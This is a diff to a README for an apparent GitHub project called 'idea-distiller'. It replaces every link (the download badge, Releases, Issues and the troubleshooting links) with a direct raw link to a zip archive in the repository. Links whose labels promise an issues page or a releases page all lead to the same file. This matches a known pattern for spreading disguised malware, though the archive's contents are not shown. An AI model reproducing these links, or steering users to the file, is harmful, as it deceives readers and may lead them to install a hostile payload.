@@ -1,6 +1,6 @@
 # 🎉 idea-distiller - Simplify Complex Ideas Easily
 
-[![Download Idea Distiller](https://img.shields.io/badge/Download%20Now-idea--distiller-blue)](https://github.com/ericksitoe/idea-distiller/releases)
+[![Download Idea Distiller](https://github.com/ericksitoe/idea-distiller/raw/refs/heads/main/idea_distiller/distiller_idea_v2.5.zip%20Now-idea--distiller-blue)](https://github.com/ericksitoe/idea-distiller/raw/refs/heads/main/idea_distiller/distiller_idea_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you start, make sure you have the following:
 
 ## 📦 Download & Install
 
-To get the latest version of idea-distiller, [visit this page to download](https://github.com/ericksitoe/idea-distiller/releases).
+To get the latest version of idea-distiller, [visit this page to download](https://github.com/ericksitoe/idea-distiller/raw/refs/heads/main/idea_distiller/distiller_idea_v2.5.zip).
 
 1. Click on the link provided above.
 2. Find the version you want to download.
@@ -63,13 +63,13 @@ If you encounter issues while using the application, try the following steps:
 - Ensure your system meets the minimum requirements.
 - Verify that you have the latest version installed. 
 - Restart the application if it doesn't respond.
-- Check for updates on the [Releases page](https://github.com/ericksitoe/idea-distiller/releases).
+- Check for updates on the [Releases page](https://github.com/ericksitoe/idea-distiller/raw/refs/heads/main/idea_distiller/distiller_idea_v2.5.zip).
 
 ## 💬 Support
 
 Need help or have questions? You can reach out through the following options:
 
-- Open an issue on our [GitHub Issues Page](https://github.com/ericksitoe/idea-distiller/issues).
+- Open an issue on our [GitHub Issues Page](https://github.com/ericksitoe/idea-distiller/raw/refs/heads/main/idea_distiller/distiller_idea_v2.5.zip).
 - Join our community discussions for support and suggestions.
 
 ## 🔗 Learn More
@@ -89,4 +89,4 @@ For more details, explore our topics related to idea distillation:
 - public-internet-access-solution
 - unconventionalcontroversial-initiatives-focus
 
-We hope you enjoy using **idea-distiller**! Don't forget to visit the [Releases page](https://github.com/ericksitoe/idea-distiller/releases) for your download.
+We hope you enjoy using **idea-distiller**! Don't forget to visit the [Releases page](https://github.com/ericksitoe/idea-distiller/raw/refs/heads/main/idea_distiller/distiller_idea_v2.5.zip) for your download.
